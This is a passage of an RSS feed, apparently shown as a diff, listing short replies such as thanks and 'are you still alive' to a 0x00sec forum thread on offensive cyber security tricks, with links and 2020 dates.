+        <dc:creator><![CDATA[Scepterx]]></dc:creator>
+        <description><![CDATA[
+            <p>Awesome summary thanks !</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/39">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/39</link>
+        <pubDate>Mon, 03 Aug 2020 08:43:23 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-39</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Don’t ask to ask <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/38">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/38</link>
+        <pubDate>Mon, 27 Jul 2020 14:19:49 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-38</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[AB2020-WEB]]></dc:creator>
+        <description><![CDATA[
+            <p>halo ，are you still alive</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/37">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/37</link>
+        <pubDate>Mon, 27 Jul 2020 14:19:16 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-37</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[b34v3r]]></dc:creator>
+        <description><![CDATA[
+            <p>THANX<br>
+Very Usefull!!</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/36">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/36</link>
+        <pubDate>Mon, 13 Jul 2020 12:29:52 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-36</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+  </channel>
+</rss>
